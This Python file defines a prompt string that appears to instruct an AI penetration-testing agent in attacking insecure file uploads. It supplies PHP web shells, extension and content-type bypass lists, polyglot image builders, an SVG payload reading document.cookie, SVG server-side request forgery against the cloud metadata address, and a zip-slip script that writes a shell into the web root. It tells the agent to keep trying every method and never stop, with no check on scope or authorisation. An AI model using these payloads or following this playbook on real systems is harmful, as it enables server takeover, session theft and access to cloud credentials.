"""
Insecure File Upload Attack Skill Prompt.
"""

FILE_UPLOAD_SKILL_PROMPT = r"""
## ATTACK SKILL: INSECURE FILE UPLOAD

**CRITICAL: This attack skill has been CLASSIFIED as file upload.**
**Follow the file upload workflow below. Do NOT switch to other attack methods**
**until you have exhausted the full detection and exploitation path.**

---

### MANDATORY FILE UPLOAD WORKFLOW

#### STEP 1: DETECTION — Find Upload Endpoints

Look for:
- Profile picture upload, document upload, invoice upload
- Avatar change, file import, backup restore
- Any `<input type="file">` in forms
- API endpoints: `/upload`, `/api/upload`, `/file/import`, `/import`

**Baseline testing:**
1. Upload a normal file (PNG, JPG, PDF) — note the response, file path, and access URL.
2. Check where the file is served from: `/uploads/filename`, `/static/files/`, CDN?
3. Check if the filename is preserved, randomized, or sanitized.

#### STEP 2: EXTENSION BYPASS

**Double extension:**
```
shell.php.jpg    →  server may parse last extension (.jpg) but execute first (.php)
shell.php%00.jpg  →  null byte truncation (older PHP)
shell.asp;.jpg    →  IIS semicolon truncation
```

**Case manipulation:**
```
shell.pHp, shell.PhP5, shell.pHP, shell.phtml
```

**Less common executable extensions:**
```
.php5, .phtml, .pht, .phar, .phps, .php7, .shtml
.jsp, .jspx, .jsw, .jsv
.asp, .aspx, .asa, .cer, .ashx
.cgi, .pl, .py, .rb
```

#### STEP 3: CONTENT-TYPE / MIME BYPASS

Change Content-Type header while uploading:
```
Content-Type: image/jpeg   →  Content-Type: application/x-php
```

Or upload with valid magic bytes prepended:
```bash
# GIF + PHP polyglot
echo 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif.php
# PNG + PHP polyglot
python3 -c "
import struct
png_header = b'\\x89PNG\\r\\n\\x1a\\n\\x00\\x00\\x00\\rIHDR...'
payload = b'<?php system(\\$_GET[\"cmd\"]); ?>'
open('shell.png.php','wb').write(png_header + payload)
"
```

#### STEP 4: SVG → XSS / SSRF

SVG files are XML — they can contain JavaScript:
```xml
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.cookie)</script>
</svg>
```

**SVG SSRF:**
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <image href="http://169.254.169.254/latest/meta-data/"/>
</svg>
```

#### STEP 5: ZIP SLIP / PATH TRAVERSAL

If the app extracts archives (ZIP, TAR, RAR):
```bash
# Create a ZIP with path traversal
python3 -c "
import zipfile
z = zipfile.ZipFile('evil.zip', 'w')
z.writestr('../../../var/www/html/shell.php', '<?php system(\$_GET[\"cmd\"]); ?>')
z.close()
"
```

#### STEP 6: POLYGLOT FILES

**JPEG + PHP polyglot (works even if image processing happens):**
```bash
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
mv image.jpg image.php.jpg
```

#### ANTI-PATTERNS (DO NOT DO):
- Do NOT stop after trying .php — try ALL executable extensions (20+ listed above).
- Do NOT ignore SVG upload — it's the most underrated upload vector.
- Do NOT forget to test ZIP/TAR extraction if file import exists.
"""
